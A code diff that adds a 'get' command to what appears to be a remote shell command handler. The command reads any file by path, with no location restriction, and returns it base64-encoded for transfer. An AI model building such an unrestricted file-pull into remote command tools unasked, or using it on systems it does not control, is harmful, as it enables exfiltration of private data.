@@ -418,6 +418,24 @@ def execute_shell_command(cmd_str):
             except Exception as e:
                 return f"Error: {str(e)}"
 
+        # Handle get command (download file)
+        if cmd_lower.startswith("get "):
+            filename = cmd_str[4:].strip().strip('"').strip("'")
+            try:
+                full_path = os.path.abspath(os.path.join(current_working_dir, filename))
+                if not os.path.exists(full_path):
+                    return f"Error: File not found: {filename}"
+                if os.path.isdir(full_path):
+                    return f"Error: {filename} is a directory"
+
+                import base64
+                with open(full_path, "rb") as f:
+                    file_content = f.read()
+                    encoded = base64.b64encode(file_content).decode('utf-8')
+                return f"__GET_FILE__:{encoded}"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
         # Handle cat command
         if cmd_lower.startswith("cat "):
             filename = cmd_str[4:].strip().strip('"').strip("'")
